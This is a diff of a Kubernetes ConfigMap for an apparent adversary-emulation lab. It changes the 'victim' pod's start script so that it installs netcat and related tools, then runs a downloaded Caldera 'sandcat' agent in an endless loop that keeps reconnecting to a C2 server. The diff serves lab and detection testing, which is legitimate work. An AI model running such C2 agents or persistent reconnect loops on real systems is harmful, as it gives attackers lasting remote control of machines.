@@ -10,7 +10,6 @@ metadata:
 data:
   start.sh: |
     #!/bin/bash
-    set -e
 
     echo "[victim] Installing tools..."
     apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd file 2>/dev/null || true
@@ -41,8 +40,16 @@ data:
     done
 
     chmod +x /tmp/sandcat
-    echo "[victim] Agent downloaded. Connecting to C2 (group: red)..."
-    /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v
+
+    # Run the agent in a loop — if it exits (C2 disconnect, task complete, etc.)
+    # wait and reconnect rather than letting the container exit and trigger a
+    # Kubernetes restart (which causes CrashLoopBackOff).
+    while true; do
+      echo "[victim] Connecting to C2 (group: red)..."
+      /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v || true
+      echo "[victim] Agent exited. Reconnecting in 30s..."
+      sleep 30
+    done
 ---
 apiVersion: apps/v1
 kind: Deployment
